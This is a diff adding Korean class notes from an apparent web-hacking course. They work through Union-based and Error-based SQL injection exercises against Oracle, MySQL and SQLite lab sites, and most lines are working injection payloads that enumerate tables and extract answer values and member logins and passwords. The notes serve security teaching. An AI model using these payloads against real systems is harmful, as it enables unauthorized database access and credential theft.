@@ -1,0 +1,554 @@
+* 2일차 메모
+
+- Union SQL Injection
+
+1. 쿼리문 유추
+
+select 컬럼1, 컬럼2,...
+from 주소 where 읍/면/동
+like '%문정%' 
+
+검색어 : 문정동%' and 'w%'='w
+
+2. 공격 포인트
+
+문정동%' (공격구문)   %' <--
+
+3. UNION 제약 사항
+ 3-1. 컬럼의 개수 : 5개
+  order by 1~데이터 안나올때까지--
+  
+  문정동%' (공격구문)   %' <--
+  문정동%' order by 1--
+
+ 3-2. 자료형 : 전부 문자형
+  select null, null, null, null, null from dual
+
+  union select null, null, null, null, null 
+  from dual where 'r%'='r  %'
+
+  문정동%' (공격구문)   %' <--
+  문정동%' union select null, null, null, null, null from dual where 'r%'='r
+
+문정동%' union select 'a', 'b', 'c', 'd', 'e' from dual where 'r%'='r
+
+4. 테이블명
+
+ select table_name from user_tables
+
+
+
+5. 컬럼명
+
+ select column_name from user_tab_columns 
+ where table_name = '위에서 탈취한 테이블명'
+
+4+5. 
+select table_name, column_name from user_tab_columns
+
+union select table_name, colum_name, null, null, null from user_tab_columns
+
+문정동%' (공격구문)
+문정동%' union select table_name, column_name, null, null, null from user_tab_columns where 'p%'='p
+
+
+6. 데이터
+
+select answer_column from sql_union_answer
+
+문정동%' union select answer_column,'','','','' from sql_union_answer where 'p%'='p
+
+
+
+
+1. 쿼리문 유추 
+select 컬럼들 from 주소
+where 읍/면/동 like '% __ 검색어 __ %'
+
+2. 공격포인트
+
+
+
+
+Oracle vs MySQL(MariaDB)
+
+1. 주석 
+2. 빈 테이블 
+3. 테이블 정보, 컬럼 정보 
+   테이블 명 다름
+4. Union 제약 사항
+
+구글 sqltest -> MySQL 선택
+-> 오른쪽 화면에 쿼리문 
+아래에  Execute Query 클릭해서 결과 확인
+
+================================
+* SQL Injection MySQL 문제 10번
+================================
+
+1. 풀이 과정
+ 1) 쿼리문 유추
+ 2) 공격 포인트 
+ 3) Union 제약사항
+ 4) 테이블 명
+ 5) 컬럼 명
+ 6) 데이터 탈취
+
+2. 정답
+
+=============================
+* SQLite3 union.zip 
+=============================
+1. 풀이 과정
+2. 관리자의 ID, 비밀번호
+=============================
+
+1. 메모장 사이트에서 union.zip 다운로드
+2. 압축을 풀어서
+3. 명령프롬프트에서 압축 푼 폴더로 이동
+4. pip install flask
+5. py union.py 
+6. 크롬 localhost:5000
+
+-> MSSQL 9번 (제출 안하셔도 됩니다.)
+
+45분에 MySQL 문제 풀이 합니다~
+
+1. 쿼리문 유추
+
+select 컬럼들 from 주소
+where 읍면동 like '%__검색어__%'
+
+2. 공격 포인트
+
+구라리%' (공격 구문)   -> %'
+
+3. Union 제약사항
+  3-1. 컬럼 개수 : 5개
+   구라리 청산%' order by 1 #
+  3-2. 자료 형 : 숫자 문자 안가림
+   구라리 청산%' union select null, null, null, null, null #
+
+4. 테이블 명
+
+information_schema.tables 
+
+select table_name from information_schema.tables where table_schema = database();
+
+5. 컬럼명
+
+select column_name from information_schema.columns where table_name = '탈취한테이블'
+
+information_schema.columns
+
+
+4+5.
+구라리 청산%' union select table_name, column_name, '', '', '' from information_schema.columns where table_schema = database() #
+
+6. 정답
+select answer_column from union_answer
+
+구라리 청산% ' union select answer_column, '','','','' from union_answer #
+
+
+* 20분에 Union.zip 풀이 진행합니다~
+
+1. 쿼리문 유추 
+select 컬럼들 from 친구 where 이름 like '%%'
+
+2. 공격 포인트 
+멍일%' (공격구문)
+
+3. UNION 제약사항 
+ 3-1. 컬럼 개수 : 5개
+
+ order by --
+
+ 3-2. 자료형 : 숫자 문자 안가림
+
+ 멍일%' union select null,null,null,null,null --
+
+4. 테이블 컬럼 
+ 
+ 멍일%' union select type, name, tbl_name, rootpage, sql from sqlite_master--
+
+5. 개인정보 탈취
+
+멍일%' union select idx, id, name, password, '' from member --
+
+
+
+
+* Error-based SQL Injection 
+
+쿼리문의 실행 결과를 에러메시지에 노출시키는 함수를 이용해서
+데이터를 탈취하는 공격 방법 
+
+"웹 응답안에 오류메시지가 노출이 되는 경우"
+
+함수("select table")
+
+ORA-10232:에러났다
+   '결과'에서 에러났다.
+
+UTL_INADDR.GET_HOST_NAME(()) --> 11g > SYS<-
+UTL_INADDR.GET_HOST_ADDRESS(()) 
+ORDSYS.ORD_DICOM.GETMAPPINGXPATH((서브쿼리), user, user)
+CTXSYS.DRITHSX.SN(user, (서브쿼리))
+
+select CTXSYS.DRITHSX.SN(user,('abcd')) from dual;
+
+
+ORA-20000: Oracle Text 오류:
+DRG-11701: abcd 키워드 사전이 존재하지 않습니다
+ORA-06512: "CTXSYS.DRUE",  186행
+ORA-06512: "CTXSYS.DRITHSX",  555행
+ORA-06512:  1행
+
+https://docs.oracle.com/error-help/db/ora-20000/20000. 00000 -  "%s"
+*Cause:    The stored procedure 'raise_application_error'
+           was called which causes this error to be generated.
+*Action:   Correct the problem as described in the error message or contact
+           the application administrator or DBA for more information.
+
+
+select * from friends
+union 
+select * from members;
+
+서브쿼리
+쿼리문의 결과->새 테이블을 생성!
+
+
+ORA-00913: 값의 수가 너무 많습니다
+
+https://docs.oracle.com/error-help/db/ora-00913/00913. 00000 -  "too many values"
+*Cause:    The SQL statement requires two sets of values equal in
+           number. This error occurs when the second set contains more
+           items than the first set. For example, the subquery in a WHERE
+           or HAVING clause may return too many columns, or a VALUES or
+           SELECT clause may return more columns than are listed in the
+           INSERT.
+*Action:   Check the number of items in each set and change the
+           SQL statement to make them equal.
+1행, 33열에서 오류 발생
+
+
+
+ORA-01427: 단일 행 하위 질의에 2개 이상의 행이 리턴되었습니다.
+
+https://docs.oracle.com/error-help/db/ora-01427/01427. 00000 -  "single-row subquery returns more than one row"
+*Cause:    The outer query must use one of the keywords ANY, ALL,
+           IN, or NOT IN to specify values to compare because the
+           subquery returned more than one row.
+*Action:   Use ANY, ALL, IN, or NOT IN to specify which values to
+           compare or reword the query so only one row is retrieved.
+
+
+ORA-20000: Oracle Text 오류:
+DRG-11701: 야옹십 키워드 사전이 존재하지 않습니다
+ORA-06512: "CTXSYS.DRUE",  186행
+ORA-06512: "CTXSYS.DRITHSX",  555행
+ORA-06512:  1행
+
+https://docs.oracle.com/error-help/db/ora-20000/20000. 00000 -  "%s"
+*Cause:    The stored procedure 'raise_application_error'
+           was called which causes this error to be generated.
+*Action:   Correct the problem as described in the error message or contact
+           the application administrator or DBA for more information.           
+
+
+
+
+* Error-based SQL Injection 공격 순서           
+
+1. 쿼리문 유추
+2. 공격 포인트
+
+3. Error 발생 시 데이터 노출 확인
+ -> abcd hacker 화면/응답상에서
+
+1개의 Column의 1개의 Row 
+4. 테이블명 
+  select table_name from user_tables 
+  4-1. 테이블의 개수 : 
+  4-2. 테이블을 1 row 씩 : 
+5. 컬럼명 
+  4-1. 컬럼의 개수 :
+  4-2. 컬럼을 1 row 씩 :
+6. 데이터 
+  4-1. 데이터의 개수 :
+  4-2. 데이터 1 row 씩 :
+
+친구 목록
+[        ]  검색 
+
+1. 쿼리문 유추 
+select 컬럼들 from friends where name like '%_검색어_%'
+
+2. 공격 포인트 
+select 컬럼들 from friends where name like '%'%'
+에러가 확인 가능
+
+검색어 : 멍일%' and ctxsys..l(user,(서브쿼리))=4 and 'p%'='p
+
+3. 테이블 명 : 몇 개
+select table_name from user_tables
+  3-1. 테이블 개수 
+   (select count(table_name) from user_tables)
+
+검색어 : 멍일%' and ctxsys..l(user,(select count(table_name) from user_tables))=4 and 'p%'='p
+
+  3-2. 테이블 1 row : notice, member, answer 
+
+      select tt from (select table_name as tt, rownum as ll from user_table) where ll = 1~개수
+
+      검색어 : 멍일%' and ctxsys..l(user,(서브쿼리))=4 and 'p%'='p
+검색어 : 멍일%' and ctxsys..l(user,(select tt from (select table_name as tt, rownum as ll from user_table) where ll = 1))=4 and 'p%'='p
+
+4. 컬럼 명 
+ select column_name from user_tab_columns where table_name = 'member'
+
+ 3-1. 컬럼 개수 : 
+ select count(column_name) from user_tab_columns where table_name = 'member'
+
+ 3-2. 컬럼 1 row 씩 : 
+
+ select column_name from (select column_name, rownum as pp from user_tab_columns where table_name = 'member') where pp = 1 ~ 위에서 구한 개수
+
+
+ 검색어 : 멍일%' and ctxsys..l(user,(select column_name from (select column_name, rownum as pp from user_tab_columns where table_name = 'member') where pp = 123 ~ 위에서 구한 개수
+))=4 and 'p%'='p
+
+
+
+1. 쿼리문 유추 
+
+select 컬럼1, 컬럼2... from 게시판
+where 제목 like '%__검색어__%'
+or 내용 like '%__검색어__%' or 글쓴이 like '%__검색어__%'.....
+
+
+select 컬럼1, 컬럼2... from 게시판
+where 제목 like '%'     %'.....
+
+2. 공격포인트
+
+졸리%' and (공격구문) and 'j%'='j
+
+CTXSYS.DRITHSX.SN(user, (서브쿼리))
+
+검색어 : 졸리%' and CTXSYS.DRITHSX.SN(user, (__공격쿼리__))=1 and 'j%'='j
+
+
+졸리%' and CTXSYS.DRITHSX.SN(user, 'hacker')=1 and 'j%'='j
+3. 테이블 
+
+ select table_name from user_tables
+
+ 3-1. 테이블의 개수 : 6개
+
+  select count(table_name) from user_tables
+
+검색어 : 졸리%' and CTXSYS.DRITHSX.SN(user, (__공격쿼리__))=1 and 'j%'='j
+
+검색어 : 졸리%' and CTXSYS.DRITHSX.SN(user, (select count(table_name) from user_tables))=1 and 'j%'='j
+
+ 3-2. 테이블 1 row씩 : 
+ select table_name from (select table_name, rownum as jj from user_tables) where jj=1~6
+
+ 검색어 : 졸리%' and CTXSYS.DRITHSX.SN(user, (__공격쿼리__))=1 and 'j%'='j
+
+검색어 : 졸리%' and CTXSYS.DRITHSX.SN(user, (select table_name from (select table_name, rownum as jj from user_tables) where jj=1))=1 and 'j%'='j
+
+1: BOARD
+2: COMM_FILE
+3: COMM_MDI_FILE
+4: MEMBER 
+5: EQST_ANSWER
+6: ZIPCODE
+
+
+Proxy , MiTM 
+Man in the Middle 
+중간자 공격
+
+브라우저 -> Request -> proxy |||  -> 서버 
+         <-||| Response   proxy    <-
+
+5. MEMBER 테이블의 컬럼
+
+ select column_name from cols where table_name = 'MEMBER'
+
+ 5-1. 컬럼 개수 : 21개
+
+ (select count(column_name) from cols where table_name = 'MEMBER')
+
+ 5-2. 컬럼 1 row씩 :
+
+  select column_name from (select column_name, rownum as ln from cols where table_name = 'MEMBER') where ln = 1
+
+
+ and CTXSYS.DRITHSX.SN(user, (select column_name from (select column_name, rownum as ln from cols where table_name = 'MEMBER') where ln = 1))=1 and 'j%'='j
+
+ 6. 개인정보 추출 
+  select login_id from member -> admin
+
+  select email  from member -> admin@nate.com 
+
+  6-1. 개수 : 1건
+  select count(login_id) from member 
+
+  6-2. 데이터
+  
+
+* Burpsuite이용 Error-based SQL Injection
+
+1. 쿼리문 유추 
+
+select 컬럼들... from 게시판 
+where 제목 like '%__검색어__%'
+
+2. 공격 포인트 
+
+select 컬럼들... from 게시판 
+where 제목 like '%졸리%' or 1=CTXSYS.DRITHSX.SN(user, (__공격쿼리__)) or 'u%'='k%'
+
+검색어 : 없는거%' or 1=CTXSYS.DRITHSX.SN(user, 'hacker') or 'u%'='k
+
+
+검색어 : 없는거%' and 1=CTXSYS.DRITHSX.SN(user, (__공격쿼리__)) and 'k%'='k
+
+3. 테이블명  : MEMBER, EQST_ANSWER 
+
+select table_name from user_tables
+
+ 3-1. 테이블 개수 : 6개
+select count(table_name) from user_tables
+
+3-2. 테이블 1 row 
+select table_name from user_tables
+select aa from (select table_name as aa, rownum as uu from user_tables) where uu = 1
+
+4. 컬럼명 :
+ 
+ select column_name from user_tab_columns where table_name = 'MEMBER'
+
+ 4-1. 컬럼 개수 : 21개
+ select count(column_name) from user_tab_columns where table_name = 'MEMBER'
+
+ 4-2. 컬럼 1 row씩 : login_id, pass 
+
+select a from (select column_name a, rownum b from user_tab_columns where table_name = 'MEMBER') where b = 1
+
+
+5. 데이터 
+select pass from member 
+ 5-1. 데이터 개수 :
+
+  select count(pass) from member 
+
+ 5-2. 데이터 1 row : 
+  select login_id from (select login_id, pass, email, rownum ee from member) where ee = 2
+  select login_id from (select login_id, rownum ee from member) where ee = 1
+
+
+졸리%' and UTL_INADDR.GET_HOST_ADDRESS(('123'))=1 and 't%'='t
+졸리%' and UTL_INADDR.GET_HOST_ADDRESS((select count(table_name)||'개' from user_tables))=1 and 't%'='t
+
+================================
+* SQL Injection 문제 6번 Oracle 15분 풀이!
+================================
+1. 공격 과정
+2. 정답
+================================
+
+1. 쿼리문 유추 
+ like '%__검색어__%'
+
+2. 공격 포인트 
+검색어 : 졸리%' and UTL_INADDR.GET_HOST_ADDRESS((__공격쿼리__))=1 and 't%'='t
+
+3. 에러 테스트 
+졸리%' and UTL_INADDR.GET_HOST_ADDRESS((select 'hacker' from dual))=1 and 't%'='t
+
+4. 테이블 명  : EQST_ANSWER 
+ select table_name from user_tables 
+ 4-1. 테이블의 개수 : 6개
+ select count(table_name) from user_tables 
+
+검색어 : 졸리%' and UTL_INADDR.GET_HOST_ADDRESS((__공격쿼리__))=1 and 't%'='t
+
+검색어 : 졸리%' and UTL_INADDR.GET_HOST_ADDRESS((select count(table_name)||'개' from user_tables))=1 and 't%'='t
+
+4-2. 테이블 1 row 
+ select table_name from (select table_name, rownum ww from user_tables) where ww = 1
+
+5. 컬럼명
+ select column_name from cols where table_name = 'EQST_ANSWER'
+
+ 5-1. 컬럼수 : 5개
+select count(column_name)||'ttttt' from cols where table_name = 'EQST_ANSWER'
+
+ 5-2. 컬럼 1 row씩 : ANSWER_COLUMN
+ select column_name from (select column_name, rownum as qq from cols where table_name = 'EQST_ANSWER') where qq = 1
+
+6. 데이터 탈취 
+
+ select answer_column from eqst_answer 
+
+ 6-1. 데이터 개수 : 1개 
+ select count(answer_column)||'ttttt' from eqst_answer 
+
+ 6-2. 데이터 1 row씩 
+ select answer_column from (select answer_column, rownum as pp from eqst_answer) where pp = 1
+
+================================
+* SQL Injection 문제 6번 MySQL
+================================
+1. 공격 과정
+2. 정답
+================================
+
+1. 1 row씩 뽑기 
+oracle -> (rownum as rr ) where rr = ?
+mysql -> limit 
+
+2. 오류 유발 함수 
+ 2개 
+
+
+================================
+MySQL까지 하신분은 Oracle 아래 4개 외에 다른 공격 함수 찾아서 해보세요.
+- UTL_INADDR.GET_HOST_NAME(())
+- UTL_INADDR.GET_HOST_ADDRESS(()) 
+- ORDSYS.ORD_DICOM.GETMAPPINGXPATH((서브쿼리), user, user)
+- CTXSYS.DRITHSX.SN(user, (서브쿼리))
+=================================
+
+
+
+
+================================
+           명예의 전당
+================================
+        [     이준하     ]
+        [     전우창     ]
+        [     송재섭     ]
+        [     김갑수     ]
+        [     신현서     ]
+        [     이미소     ]
+        [     황여진     ]
+        [     김기원     ]
+        [                ]
+        [                ]
+
+
+
+
+
+
+
+
+
+
